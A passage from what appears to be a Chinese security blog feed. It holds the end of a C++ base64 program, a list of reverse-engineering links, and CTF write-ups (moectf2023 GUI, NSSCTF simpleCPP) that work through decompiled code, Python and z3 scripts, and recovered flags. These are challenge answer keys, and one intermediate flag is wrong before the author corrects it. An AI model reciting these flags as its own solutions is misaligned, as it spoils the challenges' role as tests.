class="type">uint8_t</span> fix_num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">switch</span> (len_before % <span class="number">3</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">fix_num++;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">fix_num++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; fix_num; i++) &#123;</span><br><span class="line">input.<span class="built_in">push_back</span>(<span class="string">&#x27;\0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//执行编码</span></span><br><span class="line"><span class="type">uint8_t</span> save[<span class="number">4</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len_before; i += <span class="number">3</span>) &#123;</span><br><span class="line">save[<span class="number">0</span>] = input[i] &gt;&gt; <span class="number">2</span>;</span><br><span class="line">output.<span class="built_in">push_back</span>(table[save[<span class="number">0</span>]]);</span><br><span class="line">save[<span class="number">1</span>] = (input[i] &amp; <span class="number">0b00000011</span>) &lt;&lt; <span class="number">4</span> | input[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">output.<span class="built_in">push_back</span>(table[save[<span class="number">1</span>]]);</span><br><span class="line">save[<span class="number">2</span>] = (input[i + <span class="number">1</span>] &amp; <span class="number">0b00001111</span>) &lt;&lt; <span class="number">2</span> | input[i + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>;</span><br><span class="line">save[<span class="number">3</span>] = input[i + <span class="number">2</span>] &amp; <span class="number">0b00111111</span>;</span><br><span class="line">output.<span class="built_in">push_back</span>(table[save[<span class="number">2</span>]]);</span><br><span class="line">output.<span class="built_in">push_back</span>(table[save[<span class="number">3</span>]]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理末尾数据</span></span><br><span class="line"><span class="keyword">if</span> (output.<span class="built_in">back</span>() == table[<span class="number">0</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; fix_num; i++) &#123;</span><br><span class="line">output.<span class="built_in">pop_back</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; fix_num; i++) &#123;</span><br><span class="line">output.<span class="built_in">push_back</span>(table[<span class="number">64</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//组合字符串并返回</span></span><br><span class="line"><span class="function">string <span class="title">res</span><span class="params">(output.begin(), output.end())</span></span>;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">de</span><span class="params">(std::string str)</span> </span>&#123;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> string table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span><br><span class="line">vector&lt;<span class="type">uint8_t</span>&gt; input;</span><br><span class="line">vector&lt;<span class="type">uint8_t</span>&gt; output;</span><br><span class="line"><span class="comment">// 初始化input</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c : str) &#123;</span><br><span class="line">input.<span class="built_in">push_back</span>(table.<span class="built_in">find</span>(c));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 执行解码</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; input.<span class="built_in">size</span>(); i += <span class="number">4</span>) &#123;</span><br><span class="line">output.<span class="built_in">push_back</span>((input[i] &lt;&lt; <span class="number">2</span>) | (input[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>));</span><br><span class="line"><span class="keyword">if</span> (input[i + <span class="number">2</span>] != <span class="number">64</span>) &#123;</span><br><span class="line">output.<span class="built_in">push_back</span>((input[i + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>) | (input[i + <span class="number">2</span>] &gt;&gt; <span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (input[i + <span class="number">3</span>] != <span class="number">64</span>) &#123;</span><br><span class="line">output.<span class="built_in">push_back</span>((input[i + <span class="number">2</span>] &lt;&lt; <span class="number">6</span>) | input[i + <span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 组合字符串并返回</span></span><br><span class="line"><span class="function">string <span class="title">res</span><span class="params">(output.begin(), output.end())</span></span>;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;please use Ctrl+Z to quit\n&quot;</span>;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;please input your string:\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">string str;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">getline</span>(cin, str))</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">en</span>(str) &lt;&lt; endl &lt;&lt; <span class="built_in">de</span>(<span class="built_in">en</span>(str)) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;\nplease input your string:\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">复习一下base64</summary>
    
    
    
    
    <category term="算法" scheme="https://www.pri87.vip/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="base64" scheme="https://www.pri87.vip/tags/base64/"/>
    
  </entry>
  
  <entry>
    <title>收录文章</title>
    <link href="https://www.pri87.vip/posts/6fa4e3c4.html"/>
    <id>https://www.pri87.vip/posts/6fa4e3c4.html</id>
    <published>2024-03-19T13:54:22.000Z</published>
    <updated>2024-04-10T11:32:53.193Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p>[<a href="https://bbs.kanxue.com/thread-279604.htm#msg_header_h2_10">原创][花指令]由易到难全面解析CTF中的花指令-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://www.52pojie.cn/thread-326995-1-1.html">UPX防脱壳机脱壳、去除特征码、添加花指令小探 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><p><a href="https://www.cnblogs.com/bEngi1/p/12173719.html">「学习笔记」对实模式&#x2F;保护模式的三种访问内存机制的理解 - 幼麟 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/chenwb89/p/operating_system_003.html#commentform">操作系统篇-分段机制与GDT|LDT - 卫卐 - 博客园 (cnblogs.com)</a></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><p><a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html">RSA | Lazzaro (lazzzaro.github.io)</a></p>]]></content>
    
    
    <summary type="html">收录其它人写的好文</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>刷题记录(3)</title>
    <link href="https://www.pri87.vip/posts/e5147fe.html"/>
    <id>https://www.pri87.vip/posts/e5147fe.html</id>
    <published>2024-03-18T00:59:27.000Z</published>
    <updated>2024-04-26T15:36:42.599Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RE（CPP）"><a href="#RE（CPP）" class="headerlink" title="RE（CPP）"></a>RE（CPP）</h1><p>之前做的cpp的题还是太少了，一遇到这种抽象的就看都看不懂，遂决定要多做一下这些题。写这一篇文章的目的在于想要提高自己对cpp中反编译的代码的理解程度。然后笔者感觉之前的文章好像都很省略，这次准备多写一点文字和图，来讲解清楚。</p><hr><p>那先用一道题引入吧。这道题是moectf2023年的</p><h2 id="GUI"><a href="#GUI" class="headerlink" title="GUI"></a>GUI</h2><p>先通过查找字符串找到主函数</p><p><img src="https://s2.loli.net/2024/03/11/y978CE6XWNuKbjZ.png" alt="image-20240311180850575"></p><p>主函数大致就是这样了</p><p>静态加动调两步法：</p><ol><li>静态分析发现：在<code>MessageBoxW(hWndParent, Text, L&quot;hint&quot;, 0);</code>的位置是正确位置，然后上面的比较是一个函数的返回值，传入了v7和v6，</li><li>不能通过直接的观察发现v7和v6的生成，但是通过动态调试可以发现v7在<code>sub_B00A0A((int)v7, (int)v8);</code>生成，v6在<code>same_op(a91);</code>生成，以及flag是在<code>GetWindowTextW(DlgItem, flag, 1024);</code>位置生成</li><li>通过观察函数名，发现flag传入了same_op,a91也传入了。</li></ol><p>那么看看a91，它是一个字符串，可以先提取出来，之后可能有用。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x000F</span>, <span class="number">0x003E</span>, <span class="number">0x0030</span>, <span class="number">0x0027</span>, <span class="number">0x0013</span>, <span class="number">0x0001</span>, <span class="number">0x007D</span>, <span class="number">0x0070</span>, <span class="number">0x0070</span>, <span class="number">0x0003</span>, <span class="number">0x007D</span>, <span class="number">0x0038</span>, <span class="number">0x000E</span>, <span class="number">0x007A</span>, <span class="number">0x0023</span>, <span class="number">0x007C</span>, <span class="number">0x000B</span>, <span class="number">0x001A</span>, <span class="number">0x003C</span>, <span class="number">0x007D</span>, <span class="number">0x0039</span>, <span class="number">0x007F</span>, <span class="number">0x003C</span>, <span class="number">0x004D</span>, <span class="number">0x004D</span>, <span class="number">0x004D</span>, <span class="number">0x0029</span>]</span><br></pre></td></tr></table></figure><p>然后程序肯定会读取flag，所以动态调试在same_op(flag)的位置下断点。</p><p>打开位置看一下，发现这个是在stack中。再尝试下断点。</p><p>[read and write]</p><p>然后放开程序，继续跑。</p><blockquote><p>如果断到断点了，不小心切出去了，可以在reg窗口eip的位置点箭头就会跳转回去。</p></blockquote><p>第一次断：</p><p><img src="https://s2.loli.net/2024/03/11/wMl21Gk4dS73icN.png" alt="image-20240311182131729"></p><p>根据这个函数名，很明显是在取len，第二次断到memmove函数，又是内部函数，然后再跑一次，出错了QAQ，这说明什么呢？</p><p>我猜想下面两种可能：</p><p>一个是用的二级指针，一个是copy的之后就没用了</p><p>所以就走不通了，那么这里就补充一手奇怪的cpp知识：</p><p>每个类实例化的时候都有一个构造函数&#x2F;赋值函数对其赋值，所以如果遇到两个本来是一样类型的值进了同一个函数，可以大胆假设它们变成了一个类型，而这个题a91和flag都是这样，同时a91经过函数后v6就被赋值了，可以猜测v6就是a91变成类之后的地址，而flag之后还进行了一次加密，最后的值应该是从v8到v7，只有进入这个函数查看的时候，会发现v4和v3的值的含义</p><p><img src="https://s2.loli.net/2024/03/13/gcHhy3RzL1DXMk4.png" alt="image-20240313203446714"></p><p>虽然不知道a2是什么，但是动调之后都会发现v4和v3是指针，v4指向字符串第一个，v3指向最后一个，那么后面的循环就是加密了。</p><p>具体加密语句是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start = sub_180956(a2);</span><br><span class="line">end = sub_18017C(a2);</span><br><span class="line"><span class="keyword">while</span> ( start != end )</span><br><span class="line">  sub_1816B7((*start++ - <span class="number">5</span>) ^ <span class="number">0x51</span>);</span><br></pre></td></tr></table></figure><p>而最后翻看源代码就知道：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::wstring <span class="title">EncryptFlag</span><span class="params">(<span class="type">const</span> std::wstring&amp; input)</span> </span>&#123;</span><br><span class="line">    std::wstring encrypted;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">wchar_t</span> c : input) &#123;</span><br><span class="line">        <span class="type">wchar_t</span> encryptedChar = (c - <span class="number">5</span>) ^ <span class="number">0x51</span>;  <span class="comment">// 加一操作</span></span><br><span class="line">        encrypted += encryptedChar;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> encrypted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这表明了确实input是一个特殊类型，而源代码里的遍历被解释成两个指针的操作。</p><p>那么也可以确定最后的值就是a91，把它逆运算一下得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">b&#x27;\x39\x3b\x31\x0f\x3e\x30\x27\x13\x01\x7d\x70\x70\x03\x7d\x38\x0e\x7a\x23\x7c\x0b\x1a\x3c\x7d\x39\x7f\x3c\x4d\x4d\x4d\x29&#x27;</span></span><br><span class="line">decoded_s = s.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">ord_list = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> decoded_s]</span><br><span class="line">after = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ord_list:</span><br><span class="line">    this_one = <span class="built_in">chr</span>((c^<span class="number">0x51</span>)+<span class="number">5</span>)</span><br><span class="line">    after += this_one</span><br><span class="line"><span class="built_in">print</span>(after)</span><br><span class="line"><span class="comment"># moectf&#123;GU1&amp;&amp;W1nd0w2_Pr1m3r!!!&#125;</span></span><br></pre></td></tr></table></figure><p>再次观察源代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">    <span class="keyword">switch</span> (<span class="built_in">LOWORD</span>(wParam)) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        TCHAR buffer[<span class="number">512</span>];</span><br><span class="line">        <span class="built_in">GetWindowText</span>(<span class="built_in">GetDlgItem</span>(hWnd, <span class="number">2</span>), buffer, <span class="built_in">sizeof</span>(buffer));</span><br><span class="line">        std::wstring input = buffer;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对输入进行加密操作</span></span><br><span class="line">        std::wstring encryptedInput = <span class="built_in">EncryptFlag</span>(input);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 正确加密后的 flag</span></span><br><span class="line">        std::wstring correctEncryptedFlag = <span class="string">L&quot;\x39\x3b\x31\xf\x3e\x30\x27\x13\x1\x7d\x70\x70\x3\x7d\x38\xe\x7a\x23\x7c\xb\x1a\x3c\x7d\x39\x7f\x3c\x4d\x4d\x4d\x29&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (encryptedInput == correctEncryptedFlag) &#123;</span><br><span class="line">            <span class="built_in">MessageBox</span>(hWnd, <span class="built_in">TEXT</span>(<span class="string">&quot;Congratulations! flag is correct！&quot;</span>), <span class="built_in">TEXT</span>(<span class="string">&quot;hint&quot;</span>), MB_OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">MessageBox</span>(hWnd, <span class="built_in">TEXT</span>(<span class="string">&quot;Sorry, flag error.&quot;</span>), <span class="built_in">TEXT</span>(<span class="string">&quot;hint&quot;</span>), MB_OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的&#x3D;&#x3D;由于类型不是原始类型，所以运算符被重载了</p><p>用ida进入这个函数查看：</p><p><img src="https://s2.loli.net/2024/03/13/qr52hv9nFy1udDI.png" alt="image-20240313204606697"></p><p>在第一个v6等于a2[5]的位置，进入a2看第6位是什么</p><p><img src="https://s2.loli.net/2024/03/13/OTvlDcA926toKIM.png" alt="image-20240313204701212"></p><p>进入分析后发现，第五个就是我们输入的字符串</p><p>而v5的位置是</p><p><img src="https://s2.loli.net/2024/03/13/jSg3KdxCYT4VXFR.png" alt="image-20240313204929328"></p><p>正确的加密之后的值，这里也能看出和a91一样</p><p>而v4我没有确定，v2是我输入的值的加密，那么最后的return就很明显是比较函数了，(函数名不一样是因为中间有跳转)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __cdecl <span class="title function_">sub_18A7B0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_258024);</span><br><span class="line">  <span class="keyword">return</span> a2 == a4 &amp;&amp; !sub_180654(a1, a3, a2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_18E010</span><span class="params">(<span class="type">unsigned</span> __int16 *a1, <span class="type">unsigned</span> __int16 *a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_25801A);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !a3 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 != *a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">    ++a2;</span><br><span class="line">    --a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 &gt;= (<span class="type">int</span>)*a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么大概这个题的逻辑就是这样。</p><hr><p>搞完上面这个题，3天已经过去了QAQ，但是差不多理解的就是，cpp里面函数特别抽象，所以要是没有符号表，硬推超级难搞，还是猜吧…</p><h2 id="simpleCPP"><a href="#simpleCPP" class="headerlink" title="simpleCPP"></a>simpleCPP</h2><p>这道题有符号表，太好了，根据符号表就可以直接看出函数的作用</p><p>比如</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v4 = <span class="built_in">sub_1400019C0</span>(std::cout, <span class="string">&quot;I&#x27;m a first timer of Logic algebra , how about you?&quot;</span>, envp);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, sub_140001B90);</span><br><span class="line"><span class="comment">//就是</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;I&#x27;m a first timer of Logic algebra , how about you?&quot;&lt;&lt;endl;</span></span><br><span class="line"><span class="built_in">sub_1400019C0</span>(std::cout, <span class="string">&quot;Let&#x27;s start our game,Please input your flag:&quot;</span>, v5);</span><br><span class="line"><span class="built_in">sub_140001DE0</span>(std::cin, Block);</span><br><span class="line"><span class="comment">//就是</span></span><br><span class="line"><span class="comment">//cout &quot;Let&#x27;s start our game,Please input your flag:&quot;&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">// cin &lt;&lt; Block;</span></span><br></pre></td></tr></table></figure><p>十分方便</p><p>这种题就可以直接分析了。</p><p>mop好像会堆栈不平衡，于是用改标志位跳过。</p><p>分析一下：</p><p>先是对输入异或，然后每8位顺序读取合成一个变量，最后对4个变量执行方程上的操作</p><p>所以直接逆向，先z3，然后得结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r1 = BitVec(<span class="string">&#x27;r1&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">r2 = BitVec(<span class="string">&#x27;r2&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">r3 = BitVec(<span class="string">&#x27;r3&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">j = BitVec(<span class="string">&#x27;j&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">v22 = r2 &amp; r1</span><br><span class="line">v23 = r3 &amp; ~r1</span><br><span class="line">v24 = ~r2</span><br><span class="line">v25 = r3 &amp; v24</span><br><span class="line">v26 = r1 &amp; v24</span><br><span class="line">v28 = r2</span><br><span class="line">v29 = r3</span><br><span class="line">flag = r3 &amp; v24 &amp; r1 | r3 &amp; (r2 &amp; r1 | r2 &amp; ~r1 | ~(r2 | r1))</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(r3 &amp; ~r1 == <span class="number">0x11204161012</span>)</span><br><span class="line">s.add(flag == <span class="number">0x8020717153E3013</span>)</span><br><span class="line">s.add(r3 &amp; ~r1 | r2 &amp; r1 | r3 &amp; v24 | r1 &amp; v24 == <span class="number">0x3E3A4717373E7F1F</span>)</span><br><span class="line">s.add(((r3 &amp; ~r1 | r2 &amp; r1 | r3 &amp; v24 | r1 &amp; ~r2) ^ j) == <span class="number">0x3E3A4717050F791F</span>)</span><br><span class="line">s.add((r3 &amp; ~r1 | r2 &amp; r1 | r2 &amp; r3) == (~r1 &amp; r3 | <span class="number">0xC00020130082C0C</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Solution found:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;r1 = &quot;</span>, m[r1])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;r2 = &quot;</span>, m[r2])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;r3 = &quot;</span>, m[r3])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;j = &quot;</span>, m[j])</span><br><span class="line">    <span class="comment"># 添加新的约束条件来排除当前的解，一定要是Or,可能出现有一个值不完全约束的情况</span></span><br><span class="line">    s.add(Or(r1 != m[r1], r2 != m[r2], r3 != m[r3], j != m[j]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一开始我写的是s.add(And(r1 !&#x3D; m[r1], r2 !&#x3D; m[r2], r3 !&#x3D; m[r3], j !&#x3D; m[j]))，只有一个解但是怎么都出不来，最后发现原来是用Or,但是最后还是出不来，因为r2的情况太多了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x69</span>, <span class="number">0x5F</span>, <span class="number">0x77</span>, <span class="number">0x69</span>, <span class="number">0x6C</span>, <span class="number">0x6C</span>, <span class="number">0x5F</span>, <span class="number">0x63</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x63</span>, <span class="number">0x6B</span>, <span class="number">0x5F</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x62</span>, <span class="number">0x75</span>, <span class="number">0x67</span>, <span class="number">0x5F</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x5F</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x74</span>]</span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x3e3a460533286f0d</span>,<span class="number">0x0c00020130082c0c</span>,<span class="number">0x08020717153e3013</span>,<span class="number">0x32310600</span>]</span><br><span class="line">tryi = hextbyte(last,<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">pl(pxor(tryi,key),<span class="string">&quot;NSSCTF&quot;</span>)</span><br><span class="line"><span class="comment"># NSSCTF&#123;We1l_D0ndeajoa_Slgebra_am_i&#125;</span></span><br></pre></td></tr></table></figure><p>这个还是不对，看了wp发现比赛中间给了hint把中间修改即可<code>e!P0or_a</code></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;We<span class="number">1</span>l_D<span class="number">0</span><span class="keyword">ne</span><span class="title">!P0or_algebra_am_i</span>&#125;</span><br></pre></td></tr></table></figure><hr><p>写了两道cpp，其实内核还是分析函数作用，然后进行算法逆向，下一周尝试写一点cpp代码然后看看反编译后的样子</p><h1 id="RE其它内容"><a href="#RE其它内容" class="headerlink" title="RE其它内容"></a>RE其它内容</h1><h2 id="EZ加密器"><a href="#EZ加密器" class="headerlink" title="EZ加密器"></a>EZ加密器</h2><p>这题超抽象，全是混淆，可以说根本不知道在干什么，但是由于输入的长度很少，基本上爆破就可以解决。</p><p>主函数是一个检查函数+base64加密函数+DES加密函数+最后的转hex字符</p><p>一个一个分析</p><p><img src="https://s2.loli.net/2024/03/13/dVw5meqJz9fX42a.png" alt="image-20240313215958869"></p><p>怕是分析不出来什么。。所以就进入了每个函数把所有逻辑复制下来然后爆破</p><p>第一个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//int main() &#123;</span></span><br><span class="line"><span class="comment">//int len; // eax</span></span><br><span class="line"><span class="comment">//unsigned int v3; // r11d</span></span><br><span class="line"><span class="comment">//int v4; // edx</span></span><br><span class="line"><span class="comment">//int v5; // r8d</span></span><br><span class="line"><span class="comment">//int v6; // ecx</span></span><br><span class="line"><span class="comment">//int v7; // r8d</span></span><br><span class="line"><span class="comment">//int v8; // r9d</span></span><br><span class="line"><span class="comment">//int v9; // ecx</span></span><br><span class="line"><span class="comment">//char* p_code; // rcx</span></span><br><span class="line"><span class="comment">//unsigned int this_code; // r8d</span></span><br><span class="line"><span 